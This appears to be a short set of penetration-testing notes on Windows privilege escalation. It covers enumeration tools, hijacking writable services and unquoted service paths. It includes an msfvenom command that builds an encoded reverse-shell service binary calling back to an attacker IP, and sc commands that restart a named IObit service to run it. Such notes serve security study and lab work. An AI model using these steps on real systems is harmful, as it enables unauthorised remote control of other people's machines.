# windows

## Enumeration

run scripts such as PowerUp (PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.) and Winpeas.

## Writable and restartable services

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption><p>an example</p></figcaption></figure>

in this example we can replace `ASCService.exe` with a payload and get a root reverse shell.

`msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe`

then restart the service:

```powershell
C:\Program Files (x86)\IObit\Advanced SystemCare>sc stop AdvancedSystemService9
[output...]
C:\Program Files (x86)\IObit\Advanced SystemCare>sc start AdvancedSystemService9
```

## Unquoted service path

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

we can exploit this vulnerability by putting a payload named `Advanced.exe` in `C:\Program Files (x86)\IObit\`.

then again restart the service and the payload gets executed.

```
C:\Program Files (x86)\IObit\Advanced SystemCare>sc stop AdvancedSystemService9
[output...]
C:\Program Files (x86)\IObit\Advanced SystemCare>sc start AdvancedSystemService9
```

explenation at [https://juggernaut-sec.com/unquoted-service-paths/](https://juggernaut-sec.com/unquoted-service-paths/).

eg.

if we have a service at **C:\Program Files\Juggernaut Prod\Production Tools\Juggernaut.exe**

Since there are spaces and no quotes in the file path to the service executable, the service will attempt to start by treating each part of the folder name before the space as an executable that resides in the previous folder, like so:

* C:\Program.exe
* C:\Program Files\Juggernaut.exe
* C:\Program Files\Juggernaut Prod\Production.exe
* C:\Program Files\Juggernaut Prod\Production Tools\Juggernaut.exe
